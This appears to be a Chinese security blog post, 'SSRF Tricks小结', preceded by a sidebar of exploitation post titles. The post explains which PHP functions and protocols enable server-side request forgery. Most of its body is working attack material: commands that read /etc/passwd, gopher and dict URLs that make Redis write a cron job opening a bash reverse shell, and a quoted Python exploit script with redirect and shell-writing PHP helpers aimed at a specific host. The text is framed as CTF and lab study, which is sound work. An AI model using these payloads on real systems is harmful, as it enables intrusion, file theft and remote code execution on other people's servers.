+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+</ul>
+</li>
+<li>爬虫</li>
+<li>Django</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>NodeJS</li>
+<li>AngularJS</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程</li>
+<li>Fuzzing</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks</li>
+<li>Kali</li>
+<li>Metasploit</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+</ul>
+</li>
+<li>Linux</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<header class="post-header text-center">
+	<h1 class="title">
+		SSRF Tricks小结
+	</h1>
+	<span class="read">
+		阅读量 <span id="busuanzi_value_page_pv"></span>
+	</span>
+</header><br>
+
+<div class="book-post">
+  <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF漏洞原理很简单，这里只整理下SSRF的一些绕过技巧以及在不同语言下的细微差别。</p>
+<h2 id="0x01-SSRF-in-PHP"><a href="#0x01-SSRF-in-PHP" class="headerlink" title="0x01 SSRF in PHP"></a>0x01 SSRF in PHP</h2><h3 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h3><p>在PHP中，涉及到SSRF漏洞的函数有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
+<p>其中有如下几个注意点：</p>
+<ul>
+<li>大部分PHP并不会开启fsockopen()的Gopher Wrapper；</li>
+<li>file_get_contents()的Gopher协议不能进行URLencode；</li>
+<li>file_get_contents()关于Gopher的302跳转有bug，会导致利用失败；</li>
+<li>file_get_contents()支持php://input协议；</li>
+<li>curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用；</li>
+<li>curl_exec()默认不跟踪跳转；</li>
+</ul>
+<p>curl_exec()造成的SSRF：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>
+<p>file_get_contents()造成的SSRF：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_GET[<span class="string">'url'</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br></pre></td></tr></table></figure>
+<p>fsockopen()造成的SSRF：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) </span><br><span class="line">        &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>在PHP中能够进行SSRF攻击利用的协议：</p>
+<ul>
+<li>http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击；</li>
+<li>file：读取服务器上的任意文件内容；</li>
+<li>dict：除了泄露安装软件版本信息，还可以查看端口，操作内网Redis服务等；</li>
+<li>gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击Redis和PHP-FPM；</li>
+<li>ftp/ftps：FTP匿名访问、爆破；</li>
+<li>tftp：UDP协议扩展，发送UDP报文；</li>
+<li>imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码；</li>
+<li>telnet：SSH/Telnet匿名访问及爆破；</li>
+</ul>
+<h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>PHP中的curl_exec()函数导致的SSRF漏洞在CTF中是经常遇到的，该函数会执行cURL会话。</p>
+<p>可以通过<code>curl -V</code>命令查看curl版本及其支持的协议类型：</p>
+<p><img src="/2020/02/29/SSRF-Tricks小结/1.png" alt=""></p>
+<p>可以看到，我本地kali的是支持dict、file、gopher等等协议的。因此本地利用可使用上述几个协议。</p>
+<p>注意：Windows使用curl命令需要把单引号换成双引号。</p>
+<h4 id="file-协议任意读文件"><a href="#file-协议任意读文件" class="headerlink" title="file://协议任意读文件"></a>file://协议任意读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;file:///etc/passwd&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/29/SSRF-Tricks小结/2.png" alt=""></p>
+<h4 id="dict-协议探测端口及banner信息"><a href="#dict-协议探测端口及banner信息" class="headerlink" title="dict://协议探测端口及banner信息"></a>dict://协议探测端口及banner信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22&apos;</span><br><span class="line">curl -v &apos;dict://127.0.0.1:6379/info&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/02/29/SSRF-Tricks小结/3.png" alt=""></p>
+<h4 id="gopher-协议反弹shell"><a href="#gopher-协议反弹shell" class="headerlink" title="gopher://协议反弹shell"></a>gopher://协议反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure>
+<p>当需要更换IP和端口时，命令中的<code>$57</code>需要同时更改，因为<code>$57</code>表示的是exp字符串长度为57个字节，上面的exp即<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a</code>这段字符串URL解码后的长度为57。</p>
+<p>这部分在下面的远程利用中会具体讲到。</p>
+<h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><p>网上找的SSRF题目代码跑下就好。远程利用分为回显型和无回显型。</p>
+<p>s1.php，未做任何SSRF防御，且有回显：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    <span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用exp，比较简单，就不贴图了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.137/s1.php?url=file:///etc/passwd</span><br><span class="line">http://192.168.10.137/s1.php?url=dict://127.0.0.1:6379/info</span><br><span class="line">http://192.168.10.137/s1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a</span><br><span class="line"></span><br><span class="line"># Windows下file://协议有点区别</span><br><span class="line">http://192.168.10.137/s1.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
+<p>s2.php，限制协议为HTTP/HTTPS，且设置跳转重定向为True（默认不跳转）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时使用dict、gopher等协议已经不能像上一个题目一样直接同理，但是还可以利用302跳转的方式来绕过http/https协议限制。</p>
+<h4 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h4><p>Redis定时任务反弹shell语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h5 id="通过Gopher协议实现"><a href="#通过Gopher协议实现" class="headerlink" title="通过Gopher协议实现"></a>通过Gopher协议实现</h5><p>Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>
+<p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码。</p>
+<p>具体Gopher协议报文的构造可参考Joychou的博客：<a href="https://joychou.org/web/phpssrf.html#directory0418754728965590855" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#directory0418754728965590855</a></p>
+<h5 id="通过Dict协议实现"><a href="#通过Dict协议实现" class="headerlink" title="通过Dict协议实现"></a>通过Dict协议实现</h5><p>这部分引用自：<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>
+<blockquote>
+<p>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。</p>
+<p>利用猪猪侠的wooyun上公开的脚本改成适配本文的脚本ssrf.py：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">'104.224.151.234'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line">bhost = <span class="string">'www.4o4notfound.org'</span></span><br><span class="line">bport=<span class="number">2333</span></span><br><span class="line">vul_httpurl = <span class="string">'http://www.4o4notfound.org/ssrf.php?url='</span></span><br><span class="line">_location = <span class="string">'http://www.4o4notfound.org/302.php'</span></span><br><span class="line">shell_location = <span class="string">'http://www.4o4notfound.org/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format( host = host,</span><br><span class="line"> port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#set crontab command</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=</span></span><br><span class="line"><span class="string">&#123;bport&#125;'</span>.format( host = host, port = port, bhost = bhost, bport = bport)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(shell_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri </span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#confg set dir</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dir:/var/spool/cron/'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#config set dbfilename</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#save</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save'</span>.format( host = host, port</span><br><span class="line"> = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转。302.php代码为：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>shell.php主要用于写入用于反弹shell的crontab的定时任务，代码为：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$bhost = $_GET[<span class="string">'bhost'</span>];</span><br><span class="line">$bport = $_GET[<span class="string">'bport'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-</span></span><br><span class="line"><span class="string">i\\x20&amp;gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&amp;gt;\\x261\\x0a\\x0a\\x0a\""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
